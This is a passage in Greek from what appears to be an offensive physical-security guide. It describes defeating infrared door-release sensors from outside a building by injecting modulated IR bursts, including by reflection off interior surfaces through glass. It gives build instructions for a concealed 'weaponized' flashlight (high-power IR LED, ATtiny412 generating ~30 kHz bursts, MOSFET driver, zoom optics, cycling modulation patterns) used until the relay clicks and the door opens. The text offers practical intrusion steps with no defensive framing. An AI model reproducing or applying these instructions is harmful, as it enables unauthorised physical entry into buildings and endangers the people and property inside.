3. **Περιορίστε τη μετάδοση** – εκπέμπετε τη φέρουσα σε ρυθμισμένες ριπές (π.χ. δεκάδες χιλιοστά του δευτερολέπτου σε λειτουργία, με αντίστοιχα διαστήματα παύσης), ώστε να μεταδοθεί ο ελάχιστος αριθμός παλμών χωρίς να κορεστεί το AGC του δέκτη ή η λογική χειρισμού παρεμβολών. Η συνεχής εκπομπή αποευαισθητοποιεί γρήγορα τον αισθητήρα και εμποδίζει την ενεργοποίηση του ρελέ.

### Ανακλαστική έγχυση μεγάλης εμβέλειας
- Η αντικατάσταση του LED δοκιμών με μια δίοδο IR υψηλής ισχύος, οδηγό MOSFET και οπτικά εστίασης επιτρέπει αξιόπιστη ενεργοποίηση από απόσταση ~6 m.
- Ο εισβολέας δεν χρειάζεται οπτική επαφή με το άνοιγμα του δέκτη· αν στρέψει τη δέσμη σε εσωτερικούς τοίχους, ράφια ή κάσες θυρών που είναι ορατές μέσα από γυαλί, η ανακλώμενη ενέργεια μπορεί να εισέλθει στο οπτικό πεδίο ~30° και να μιμηθεί μια κίνηση χεριού από κοντινή απόσταση.
- Επειδή οι δέκτες αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να ανακλαστεί σε πολλές επιφάνειες και να παραμείνει πάνω από το όριο ανίχνευσης.

### Φακός επίθεσης οπλισμένος για χρήση
- Η ενσωμάτωση του οδηγού σε έναν εμπορικό φακό κρύβει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με LED IR υψηλής ισχύος, προσαρμοσμένο στη ζώνη συχνοτήτων του δέκτη, προσθέστε ένα ATtiny412 (ή παρόμοιο) για να παράγει τις ριπές ≈30 kHz και χρησιμοποιήστε ένα MOSFET για να απορροφά το ρεύμα του LED.
- Ένας τηλεσκοπικός φακός zoom συγκεντρώνει τη δέσμη για μεγαλύτερη εμβέλεια και ακρίβεια, ενώ ένας κινητήρας δόνησης, ελεγχόμενος από MCU, παρέχει απτική επιβεβαίωση ότι η διαμόρφωση είναι ενεργή χωρίς να εκπέμπεται ορατό φως.
- Η εναλλαγή μεταξύ πολλών αποθηκευμένων μοτίβων διαμόρφωσης (με ελαφρώς διαφορετικές συχνότητες φέρουσας και περιβλήματα) αυξάνει τη συμβατότητα μεταξύ οικογενειών αισθητήρων που πωλούνται με διαφορετικές επωνυμίες. Έτσι, ο χειριστής μπορεί να σαρώσει ανακλαστικές επιφάνειες μέχρι να ακουστεί το κλικ του ρελέ και να ανοίξει η πόρτα.
